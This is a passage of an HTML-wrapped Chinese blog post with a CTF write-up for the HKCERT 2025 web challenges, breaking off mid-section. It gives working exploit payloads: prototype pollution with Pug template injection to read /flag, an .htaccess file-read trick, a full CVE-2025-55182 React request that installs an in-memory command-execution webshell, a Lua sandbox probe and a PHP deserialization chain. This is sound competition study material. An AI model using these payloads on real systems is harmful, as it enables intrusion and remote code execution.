@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这次打的 OPEN 组。第 4，晋级。我所在的联合战队 W&amp;M 这次是 INTERNATIONAL 冠军。想想马上就能在香港见到大家还是有点激动。（不过我中六可能线下去不去还两说，唉，DSE） 写个 web wp：做出来的就写自己的，做不出来就找 W&amp;M 的复现了写。就当是记录了。H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HKCERT 2025 web 部分wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="这次打的 OPEN 组。第 4，晋级。我所在的联合战队 W&amp;M 这次是 INTERNATIONAL 冠军。想想马上就能在香港见到大家还是有点激动。（不过我中六可能线下去不去还两说，唉，DSE） 写个 web wp：做出来的就写自己的，做不出来就找 W&amp;M 的复现了写。就当是记录了。H">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19383927/11.png">
+<meta property="article:published_time" content="2025-12-22T10:50:00.000Z">
+<meta property="article:modified_time" content="2025-12-22T10:50:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/19383927/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>HKCERT 2025 web 部分wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2026-02-08-hkcert-2025-final/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-12-10-19328800/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&text=HKCERT 2025 web 部分wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&is_video=false&description=HKCERT 2025 web 部分wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HKCERT 2025 web 部分wp&body=Check out this article: https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&title=HKCERT 2025 web 部分wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&name=HKCERT 2025 web 部分wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-12-22-hkcert-2025-web-wp/&t=HKCERT 2025 web 部分wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjs"><span class="toc-number">1.</span> <span class="toc-text">ezjs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BabyUpload"><span class="toc-number">2.</span> <span class="toc-text">BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#react"><span class="toc-number">3.</span> <span class="toc-text">react</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-lua"><span class="toc-number">4.</span> <span class="toc-text">easy-lua</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#r"><span class="toc-number">5.</span> <span class="toc-text">r</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insph"><span class="toc-number">6.</span> <span class="toc-text">insph</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#renderme"><span class="toc-number">7.</span> <span class="toc-text">renderme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dam-Breach"><span class="toc-number">8.</span> <span class="toc-text">Dam Breach</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nettools"><span class="toc-number">9.</span> <span class="toc-text">nettools</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HKCERT 2025 web 部分wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-12-22T10:50:00.000Z" class="dt-published" itemprop="datePublished">2025-12-22</time>
+        
+        (Updated: <time datetime="2025-12-22T10:50:00.000Z" class="dt-updated" itemprop="dateModified">2025-12-22</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这次打的 OPEN 组。第 4，晋级。我所在的联合战队 W&amp;M 这次是 INTERNATIONAL 冠军。想想马上就能在香港见到大家还是有点激动。（不过我中六可能线下去不去还两说，唉，DSE）</p>
+<p>写个 web wp：做出来的就写自己的，做不出来就找 W&amp;M 的复现了写。就当是记录了。HKCERT 今年刚好在本人期末前两天，这里也要感谢同队的 pwn 小高手 jerrythepro 带飞我。</p>
+<p>（正准备复现呢发现没法开平台……我真日了，那我只能靠记忆和联队的共享文档写了（补：过了一天好像又重新开放靶机了……））</p>
+<h1 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h1><p>新生赛题。给到 NPC。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">const expres=require(&#x27;express&#x27;)</span><br><span class="line">const JSON5 = require(&#x27;json5&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;)</span><br><span class="line">const pugjs=require(&#x27;pug&#x27;)</span><br><span class="line">const session = require(&#x27;express-session&#x27;)</span><br><span class="line">const rand = require(&#x27;string-random&#x27;)</span><br><span class="line">var cookieParser = require(&#x27;cookie-parser&#x27;);</span><br><span class="line">const SECRET = rand(32, &#x27;0123456789abcdef&#x27;)</span><br><span class="line"></span><br><span class="line">const port=80</span><br><span class="line">const app=expres()</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;))</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    secret: SECRET,</span><br><span class="line">    resave: false,</span><br><span class="line">    saveUninitialized:  true,</span><br><span class="line">    cookie: &#123; maxAge: 3600 * 1000 &#125;</span><br><span class="line">&#125;));</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">function waf(obj, arr)&#123;</span><br><span class="line">    let verify = true;</span><br><span class="line"></span><br><span class="line">    Object.keys(obj).forEach((key) =&gt; &#123;</span><br><span class="line">        if (arr.indexOf(key) &gt; -1) &#123;</span><br><span class="line">            verify = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    return verify;</span><br><span class="line">&#125;</span><br><span class="line">app.get(&#x27;/&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    res.send(&#x27;hey bro!&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/login&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    let userinfo=JSON.stringify(req.body)</span><br><span class="line">    const user = JSON5.parse(userinfo)</span><br><span class="line">    if (waf(user, [&#x27;admin&#x27;])) &#123;</span><br><span class="line">        req.session.user  = user</span><br><span class="line">        if(req. session.user.admin==true)&#123;</span><br><span class="line">            req.session.user=&#x27;admin&#x27;</span><br><span class="line">            res.send(&#x27;hello,admin&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            res.send(&#x27;hello,guest&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        res.send(&#x27;login error!&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/render&#x27;,(req,res)=&gt;&#123;</span><br><span class="line">    if (req.session.user === &#x27;admin&#x27;)&#123;</span><br><span class="line">    </span><br><span class="line">        var word = req.body.word</span><br><span class="line">        </span><br><span class="line">        const blacklist = [&#x27;require&#x27;, &#x27;exec&#x27;]</span><br><span class="line">        let isBlocked = false</span><br><span class="line">        </span><br><span class="line">        if (word) &#123;</span><br><span class="line">            for (let keyword of blacklist) &#123;</span><br><span class="line">                if (word.toLowerCase().includes(keyword.toLowerCase())) &#123;</span><br><span class="line">                    isBlocked = true</span><br><span class="line">                    break</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (isBlocked) &#123;</span><br><span class="line">            res.send(&#x27;Blocked:  dangerous keywords detected!&#x27;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var hello=&#x27;welcome &#x27;+ word</span><br><span class="line">            res.send (pugjs.render(hello))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.send(&#x27;you are not admin&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`Example app listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>要登陆 admin。session 密钥是随机的。这里很明显有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function waf(obj, arr)&#123;</span><br><span class="line">    let verify = true;</span><br><span class="line"></span><br><span class="line">    Object.keys(obj).forEach((key) =&gt; &#123;</span><br><span class="line">        if (arr.indexOf(key) &gt; -1) &#123;</span><br><span class="line">            verify = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    return verify;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会把请求体的东西与 <code>user</code> 这个 object merge 一下。很明显的原型链污染。见：<a target="_blank" rel="noopener" href="https://mdn.org.cn/en-US/docs/Web/Security/Attacks/Prototype_pollution">https://mdn.org.cn/en-US/docs/Web/Security/Attacks/Prototype_pollution</a></p>
+<p>在 &#x2F;login 路由 json 传{“__proto__“:{“admin”:true}}登录。</p>
+<p>很明显 &#x2F;render 路由有 SSTI 的 sink。这里有黑名单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const blacklist = [&#x27;require&#x27;, &#x27;exec&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>用<code>mainModule</code>找<code>constructor</code>返回一个<code>process</code>的<code>object</code>，再找<code>_fs</code>直接读即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=#&#123;process.mainModule.constructor(&#x27;return process&#x27;)().mainModule.constructor._load(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;,&#x27;utf8&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>办法很多，也可以参考其他师傅的wp。</p>
+<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>比较不错的一道题。给到顶级。</p>
+<p>黑盒，简单测了一下。文件名和文件内容不允许包含<code>p</code>字符（以及一些其它的敏感字符，如<code>?</code>）。上传的文件会去 <code>/upload</code> 目录下。注意到该目录下无php文件。不考虑<code>.user.ini</code>，ban了<code>?</code>，不考虑短标签和asp形式的标签的前提下暂时不考虑 php 木马。看报错页面，注意到为 apache。考虑<code>.htaccess</code>相关攻击（<code>.htaccess</code>中不含字符<code>p</code>）</p>
+<p>apache的<code>.htaccess</code>遵循<code>apache expressions</code>规则。考虑以下文档：</p>
+<p><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/expr.html">https://httpd.apache.org/docs/2.4/expr.html</a></p>
+<p>我们可以用 <code>file</code> 函数读取文件。随后，可以用<code>ErrorDocument</code>控制返回页面的<code>HTTP 状态码</code>。同时apache为我们提供了比较运算符：</p>
+<p><img src="/images/migrated/19383927/01.png" alt="image"></p>
+<p>可以读文件；可以控制返回页面；可以比较字符。考虑传统的布尔盲注二分法解题。然而，赛后与某位中学组 web 高高手讨论得，如下 payload 亦成立：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument 404 &quot;%&#123;file:/flag&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用<code>%{}</code>语法。因此，此处可以直接读取文件值。我们上传此<code>.htaccess</code>文件，随后访问<code>/upload/xxx</code>使其触发 404 报错得到 flag。</p>
+<h1 id="react"><a href="#react" class="headerlink" title="react"></a>react</h1><p>纯 CVE 复现。也是新生赛题。给到 NPC。</p>
+<p>CVE 为 CVE-2025-55182。参考：<a target="_blank" rel="noopener" href="https://wiki.bafangwy.com/doc/896/">https://wiki.bafangwy.com/doc/896/</a></p>
+<p>公式内存马出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: XXXX</span><br><span class="line">Next-Action: x</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;&#123;\&quot;then\&quot;:\&quot;$B1337\&quot;&#125;&quot;,&quot;_response&quot;:&#123;&quot;_prefix&quot;:&quot;(async()=&gt;&#123;const http=await import(&#x27;node:http&#x27;);const url=await import(&#x27;node:url&#x27;);const cp=await import(&#x27;node:child_process&#x27;);const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args)&#123;if(event===&#x27;request&#x27;)&#123;const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname===&#x27;/exec&#x27;)&#123;const cmd=parsedUrl.query.cmd||&#x27;whoami&#x27;;cp.exec(cmd,(err,stdout,stderr)=&gt;&#123;res.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;);res.end(JSON.stringify(&#123;success:!err,stdout,stderr,error:err?err.message:null&#125;));&#125;);return true;&#125;&#125;return originalEmit.apply(this,arguments);&#125;;&#125;)();&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:&#123;&quot;get&quot;:&quot;$1:constructor:constructor&quot;&#125;&#125;&#125;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>/exec?cmd=cat%20/f*</code> 得到 flag。</p>
+<h1 id="easy-lua"><a href="#easy-lua" class="headerlink" title="easy-lua"></a>easy-lua</h1><p>十年内无人能懂出题人想法。给到拉完了。</p>
+<p>是一个经典的 Jail 类型题目。然而黑盒。这里的题解是，用以下 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for name, value in pairs(_G) do</span><br><span class="line">    if type(value) == &quot;function&quot; then</span><br><span class="line">        print(name)</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>获取当前沙箱内所有函数。有：</p>
+<p><img src="/images/migrated/19383927/02.png" alt="image"></p>
+<p>注意到有<code>S3cr3t0sEx3cFunc</code>。猜测为危险函数。调用执行命令获得 flag：</p>
+<p><img src="/images/migrated/19383927/03.png" alt="image"></p>
+<p>至于如何想到有隐藏的恶意函数，而又如何想到该函数如何使用，本人不太清楚。</p>
+<h1 id="r"><a href="#r" class="headerlink" title="r"></a>r</h1><p>好题，给到顶级。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class RequestHandler &#123;</span><br><span class="line">    public $processor;</span><br><span class="line">    public $action;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;processor = new class &#123;</span><br><span class="line">            private $handle;</span><br><span class="line">            </span><br><span class="line">            public function __construct() &#123;</span><br><span class="line">                $this-&gt;handle = tmpfile();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            public function __wakeup() &#123;</span><br><span class="line">                $this-&gt;handle = null;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            public function execute() &#123;</span><br><span class="line">                if (!is_resource($this-&gt;handle)) &#123;</span><br><span class="line">                    die(&quot;Invalid resource state&lt;br&gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (!is_array($this-&gt;action)) &#123;</span><br><span class="line">            die(&quot;Error: action must be an array&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $cb=$this-&gt;action;</span><br><span class="line">        $cb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload = $_GET[&#x27;p&#x27;] ?? &#x27;O:14:&quot;RequestHandler&quot;:N&#x27;;</span><br><span class="line">@unserialize($payload);</span><br></pre></td></tr></table></figure>
+
+<p>php中有<code>可调用数组</code>一说。当数组的第一个元素为 object，第二个元素为函数名称时。直接 call 这个数组会调用该 object 下的函数。</p>
+<p>注意到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup() &#123;</span><br><span class="line">    $this-&gt;handle = null;  // 将handle设为null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里不能让他调用到 <code>__wakeup</code> 否则后续的 <code>is_resource</code> 检查会失败。PHP的<code>__wakeup()</code>在对象完全构造后调用，但我们可以通过引用或特殊构造绕过。这里我们尝试通过回调<code>__construct</code>来构造。</p>
+<p>利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">O:14:&quot;RequestHandler&quot;:2:&#123;  # 外层RequestHandler对象</span><br><span class="line">    s:9:&quot;processor&quot;;N;     # processor为null</span><br><span class="line">    s:6:&quot;action&quot;;a:2:&#123;     # action是数组，有2个元素</span><br><span class="line">        i:0;O:14:&quot;RequestHandler&quot;:2:&#123;  # 第0个元素：内层RequestHandler对象</span><br><span class="line">            s:9:&quot;processor&quot;;N;         # processor为null</span><br><span class="line">            s:6:&quot;action&quot;;a:2:&#123;         # action是数组</span><br><span class="line">                i:0;R:5;               # 引用到第5个元素</span><br><span class="line">                i:1;s:7:&quot;execute&quot;;     # 字符串&quot;execute&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i:1;s:11:&quot;__construct&quot;;       # 第1个元素：字符串&quot;__construct&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处第5个元素为内层的<code>RequestHandler</code>。在PHP序列化中，元素的计数从1开始。</p>
+<ul>
+<li>外层RequestHandler对象（位置1）</li>
+<li>属性”processor”（null，位置2）</li>
